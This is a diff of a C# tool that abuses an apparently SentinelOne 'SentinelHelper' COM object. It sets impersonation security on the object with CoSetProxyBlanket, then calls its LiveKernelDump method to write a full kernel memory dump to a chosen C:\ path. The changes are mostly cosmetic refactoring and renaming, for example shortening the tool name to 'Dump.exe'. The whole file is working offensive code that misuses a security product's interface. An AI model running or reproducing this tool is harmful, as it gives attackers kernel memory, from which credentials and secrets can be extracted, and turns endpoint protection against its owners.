@@ -1,7 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 
-public class ImpTest
+class Program
 {
     [DllImport("Ole32.dll", CharSet = CharSet.Auto)]
     public static extern int CoSetProxyBlanket(
@@ -14,7 +14,6 @@ public class ImpTest
         IntPtr pAuthInfo,
         uint dwCapabilities
     );
-
     public static int SetSecurity(object objDCOM)
     {
         IntPtr dispatchInterface = Marshal.GetIDispatchForObject(objDCOM);
@@ -30,19 +29,15 @@ public class ImpTest
         );
         return hr;
     }
-}
 
-class Program
-{
     public static object GetHelperComObject()
     {
         try
         {
             Console.WriteLine("[+] Initializing SentinelHelper COM object...");
-            ImpTest impTest = new ImpTest();
             object sentinelHelper = Activator.CreateInstance(Type.GetTypeFromProgID("SentinelHelper.1"));
             Console.WriteLine("[+] SentinelHelper COM object initialized successfully!");
-            ImpTest.SetSecurity(sentinelHelper);
+            SetSecurity(sentinelHelper);
             return sentinelHelper;
         }
         catch
@@ -58,22 +53,21 @@ class Program
             Console.WriteLine($"[+] Trying to dump kernel to {outPath}...");
             dynamic sentinelHelper = GetHelperComObject();
             sentinelHelper.LiveKernelDump(outPath);
-            Console.WriteLine("[+] Success!");
+            Console.WriteLine("[+] Successfully dumped kernel!");
         }
         catch
         {
             Console.WriteLine("[!] Uh-oh, something went wrong!");
- 
         }
     }
 
     public static void PrintHelp()
     {
-        Console.WriteLine("[+] Usage: DumpKernel-S1.exe --output C:\\kernel.dmp");
+        Console.WriteLine("[+] Usage: Dump.exe --output C:\\kernel.dmp");
     }
 
     static void Main(string[] args)
-    {   
+    {
         if (args.Length == 2)
         {
             if (args[0] == "--output" && args[1].StartsWith("C:\\"))
